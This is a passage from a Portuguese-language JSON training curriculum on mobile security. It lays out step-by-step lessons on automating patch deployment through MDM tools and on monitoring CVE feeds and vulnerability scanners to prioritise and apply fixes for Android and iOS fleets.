                                  "tips": "Automatize com webhooks para feeds CVE; revise mensalmente.",
                                  "learningObjective": "Estabelecer priorização inteligente e monitoramento contínuo do ciclo de patches.",
                                  "commonMistakes": [
                                    "Falta de thresholds claros para priorização",
                                    "Não testar alertas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Validar e Manter o Ciclo de Patches",
                                  "subSteps": [
                                    "Executar simulação de patch crítico em ambiente de staging.",
                                    "Auditar conformidade pós-deploy em frota completa.",
                                    "Treinar equipe de suporte para handling de exceções.",
                                    "Agendar revisões trimestrais do plano e políticas.",
                                    "Documentar lições aprendidas e atualizar playbook."
                                  ],
                                  "verification": "Relatório final de teste com zero falhas críticas e playbook atualizado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente de staging com clones de dispositivos",
                                    "Templates de relatório MDM"
                                  ],
                                  "tips": "Registre métricas como tempo médio de patch (MTTR); integre com incident response.",
                                  "learningObjective": "Garantir sustentabilidade e eficácia do gerenciamento automatizado de patches.",
                                  "commonMistakes": [
                                    "Pular testes em escala",
                                    "Não documentar exceções"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa de saúde com 500 smartphones Android/iOS para enfermeiros, configure políticas no Intune/Jamf para aplicar automaticamente patches de segurança contra uma vulnerabilidade CVE-2023-XXXX, priorizando dispositivos em UTIs, com monitoramento diário de conformidade >98%.",
                              "finalVerifications": [
                                "Todas políticas de auto-update configuradas e pushadas para 100% da frota.",
                                "Simulação de patch crítico aplicada com sucesso em staging e produção piloto.",
                                "Dashboard de monitoramento ativo com alertas configurados e testados.",
                                "Relatório de conformidade gerado mostrando priorização correta.",
                                "Playbook de rollback documentado e equipe treinada.",
                                "Integração com feeds de segurança validada com dados reais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de políticas Android/iOS (sem erros de sintaxe).",
                                "Tempo de deployment de patch crítico <24h em simulação.",
                                "Taxa de conformidade >95% em auditoria automatizada.",
                                "Cobertura completa de priorização baseada em CVSS.",
                                "Documentação clara com métricas de sucesso (MTTR, uptime).",
                                "Capacidade de troubleshooting demonstrada em cenários de falha."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Automação CI/CD para deployment de patches.",
                                "Gestão de TI: Integração com asset management e CMDB.",
                                "Conformidade Regulatória: Alinhamento com NIST 800-53 SC-7 e GDPR.",
                                "Análise de Riscos: Avaliação de CVEs e threat modeling."
                              ],
                              "realWorldApplication": "Empresas como bancos e hospitais usam isso para mitigar exploits zero-day em dispositivos móveis de funcionários, reduzindo tempo de exposição a vulnerabilidades de semanas para horas, garantindo continuidade operacional e conformidade com padrões como PCI-DSS."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.3.3",
                            "name": "Monitorar Vulnerabilidades Conhecidas",
                            "description": "Utilizar feeds como CVE e ferramentas de gerenciamento de vulnerabilidades para rastrear e aplicar patches específicos em apps e SO móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Acesso a Feeds de Vulnerabilidades como CVE",
                                  "subSteps": [
                                    "Acesse o site oficial do National Vulnerability Database (NVD) em nvd.nist.gov",
                                    "Crie uma conta gratuita ou use APIs públicas para feeds RSS/JSON de CVEs",
                                    "Configure filtros para vulnerabilidades em plataformas móveis (Android, iOS, apps específicos)",
                                    "Instale um leitor de feeds como Feedly ou um script simples em Python para parsing",
                                    "Teste o feed importando as últimas 10 CVEs relacionadas a mobile"
                                  ],
                                  "verification": "Confirme que o feed está atualizando com novas CVEs mobile em tempo real",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Acesso à internet",
                                    "Navegador web",
                                    "Conta NVD (gratuita)",
                                    "Feed reader ou Python com feedparser library"
                                  ],
                                  "tips": "Use filtros por CPE (Common Platform Enumeration) para SOs móveis como 'android' ou 'apple_ios'",
                                  "learningObjective": "Entender e configurar fontes primárias de dados de vulnerabilidades conhecidas",
                                  "commonMistakes": [
                                    "Ignorar autenticação API",
                                    "Não filtrar por mobile, sobrecarregando com dados irrelevantes",
                                    "Usar feeds não oficiais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Selecionar e Configurar Ferramentas de Gerenciamento de Vulnerabilidades",
                                  "subSteps": [
                                    "Escolha ferramentas open-source como OpenVAS ou OWASP Dependency-Check para mobile",
                                    "Instale a ferramenta em um ambiente de teste (VM ou container Docker)",
                                    "Configure scans para targeting apps e SOs móveis (ex: APKs Android ou IPAs iOS)",
                                    "Integre feeds CVE com a ferramenta via plugins ou scripts",
                                    "Execute um scan inicial em um app de amostra para validar setup"
                                  ],
                                  "verification": "A ferramenta detecta pelo menos 3 CVEs conhecidas em um app de teste",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Docker ou VM",
                                    "OpenVAS/OWASP tools",
                                    "App de teste vulnerável (ex: DVWA mobile)",
                                    "Documentação oficial das ferramentas"
                                  ],
                                  "tips": "Comece com ferramentas leves para mobile; evite scanners pesados em dispositivos reais",
                                  "learningObjective": "Dominar configuração de ferramentas para automação de detecção de vulnerabilidades",
                                  "commonMistakes": [
                                    "Não isolar ambiente de teste",
                                    "Pular calibração de scans para falsos positivos",
                                    "Ignorar dependências de SO"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Monitorar e Analisar Vulnerabilidades Relevantes para Dispositivos Móveis",
                                  "subSteps": [
                                    "Agende scans diários/semanal usando cron jobs ou built-in schedulers",
                                    "Analise relatórios: priorize por CVSS score >7 e impacto em mobile (confidencialidade/integridade)",
                                    "Correlacione CVEs com inventário de apps/SOs (ex: versão Android 12)",
                                    "Documente achados em uma planilha ou ferramenta como Jira/Trello",
                                    "Crie alertas para CVEs novas via email/Slack integration"
                                  ],
                                  "verification": "Gere um relatório com 5 vulnerabilidades priorizadas e justificativas",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Inventário de apps/SOs",
                                    "Planilha Google Sheets",
                                    "Ferramenta de ticketing",
                                    "Scripts de automação (Bash/Python)"
                                  ],
                                  "tips": "Use scores CVSS v3.1 para priorização; foque em exploits ativos via Exploit-DB",
                                  "learningObjective": "Desenvolver habilidades de triagem e análise contextual de ameaças mobile",
                                  "commonMistakes": [
                                    "Priorizar por nome em vez de score/impacto",
                                    "Não mapear para assets reais",
                                    "Overlook chain vulnerabilities"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Patches e Verificar Correções",
                                  "subSteps": [
                                    "Identifique patches oficiais via vendor sites (Google Play Protect, Apple Security Updates)",
                                    "Aplique patches em ambiente staged (não produção primeiro)",
                                    "Reescaneie pós-patch para confirmar remediação",
                                    "Documente o ciclo: CVE ID, patch aplicado, data, responsável",
                                    "Atualize políticas de patching baseadas em lições aprendidas"
                                  ],
                                  "verification": "Reescane mostra CVE resolvida com evidência (antes/depois screenshots)",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Acesso admin a dispositivos/apps de teste",
                                    "Vendor patch notes",
                                    "Scanner tool do Step 2"
                                  ],
                                  "tips": "Teste patches em emuladores primeiro (Android Studio Emulator, iOS Simulator)",
                                  "learningObjective": "Executar remediação segura e verificável de vulnerabilidades",
                                  "commonMistakes": [
                                    "Aplicar patches sem backup",
                                    "Pular reescane",
                                    "Ignorar regressões de segurança"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Automatizar e Manter o Processo de Monitoramento",
                                  "subSteps": [
                                    "Crie scripts para automação end-to-end (feed pull > scan > alert > patch check)",
                                    "Integre com SIEM ou ferramentas como ELK Stack para logging",
                                    "Defina KPIs: tempo médio de patch, % CVEs resolvidas",
                                    "Treine equipe com playbook documentado",
                                    "Revise mensalmente feeds e ferramentas para updates"
                                  ],
                                  "verification": "Execute script automatizado end-to-end com sucesso e logs",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Python/Git para scripts",
                                    "SIEM trial (ex: Splunk free)",
                                    "Playbook template Markdown"
                                  ],
                                  "tips": "Use Git para versionar scripts; webhook para notificações instantâneas",
                                  "learningObjective": "Implementar monitoramento sustentável e escalável",
                                  "commonMistakes": [
                                    "Automação sem testes",
                                    "Falta de logging",
                                    "Não escalar para produção"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa com 500 dispositivos Android, configure CVE feeds filtrados por 'cpe:2.3:a:android:*', use OpenVAS para scans semanais em apps corporativos, detecte CVE-2023-XXXX em WhatsApp, priorize por CVSS 8.8, aplique update via MDM (ex: Intune), reescane confirme zero-day resolvido.",
                              "finalVerifications": [
                                "Lista de 10 CVEs mobile recentes rastreadas corretamente",
                                "Relatório de scan com priorização e patches aplicados",
                                "Script de automação rodando sem erros",
                                "Playbook documentado com passos reproduzíveis",
                                "Alertas configurados e testados",
                                "KPIs mensais tracked (ex: MTTR < 7 dias)"
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de feeds (100% CVEs relevantes capturadas)",
                                "Eficiência de análise (priorização alinhada a CVSS/impacto mobile)",
                                "Taxa de remediação (90%+ CVEs patched em 48h)",
                                "Qualidade da documentação (clara, acionável)",
                                "Automação robusta (roda 5x sem falhas)",
                                "Conhecimento demonstrado em quiz sobre CVEs mobile comuns"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Integração com firewalls para bloqueio de exploits",
                                "Programação: Scripts Python para parsing CVE JSON",
                                "Gestão de Projetos: Uso de Agile para ciclos de patching",
                                "Ética em TI: Conformidade com GDPR/HIPAA em dados mobile",
                                "Análise de Dados: Dashboards com métricas de vulnerabilidades"
                              ],
                              "realWorldApplication": "Em equipes de TI de empresas como bancos ou saúde, onde frotas de smartphones empresariais são alvos de ransomware; monitoramento proativo previne breaches, reduzindo custos de incidentes em até 70% conforme relatórios Verizon DBIR."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            ],
            "totalSkills": 328
          }
        ],
        "totalSkills": 328
      }
    ]
  }
}